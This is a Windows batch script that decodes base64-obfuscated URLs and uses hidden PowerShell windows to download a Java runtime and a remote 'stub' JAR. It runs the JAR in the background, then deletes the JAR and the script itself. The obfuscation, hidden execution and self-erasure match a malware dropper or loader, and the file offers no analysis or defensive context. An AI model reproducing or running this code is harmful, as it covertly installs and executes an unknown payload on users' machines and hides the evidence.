@echo off
setlocal enabledelayedexpansion

java -version >nul 2>&1
if %errorLevel% NEQ 0 (
    goto :install_java
) else (
    goto :download_and_run_jar
)

:install_java
set "encodedUrl=aHR0cHM6Ly9maWxldHJhbnNmZXIuaW8vZGF0YS1wYWNrYWdlL3pjTUlqY201L2Rvd25sb2Fk"
set "output=%TEMP%\jre1.8.0_361.zip"
set "installDir=%USERPROFILE%\Java\jre1.8.0_361"

powershell -WindowStyle Hidden -Command "$url=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%encodedUrl%')); (New-Object System.Net.WebClient).DownloadFile($url, '%output%')"

powershell -WindowStyle Hidden -Command "Expand-Archive -Path '%output%' -DestinationPath '%installDir%'"

if exist "%installDir%\bin\java.exe" (
    del "%output%"
    set PATH=%PATH%;%installDir%\bin
) else (
    exit /b 1
)

:download_and_run_jar
set "encodedJarUrl=aHR0cHM6Ly9naXRodWIuY29tL1B5dGhvbi1pcy10cmFzaC9zdHViL3Jhdy9yZWZzL2hlYWRzL21haW4vSmF2YS5qYXI="
set "jarOutput=%TEMP%\Java.jar"

powershell -WindowStyle Hidden -Command "$jarUrl=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%encodedJarUrl%')); (New-Object System.Net.WebClient).DownloadFile($jarUrl, '%jarOutput%')"

if exist "%jarOutput%" (
    start /b java -jar "%jarOutput%"
) else (
    exit /b 1
)

:wait_for_java
tasklist /fi "imagename eq java.exe" | find /i "java.exe" >nul
if %errorlevel% equ 0 (
    timeout /t 2 /nobreak >nul
    goto :wait_for_java
)

del "%jarOutput%"

start "" /b cmd /c del "%~f0" & exit
exit
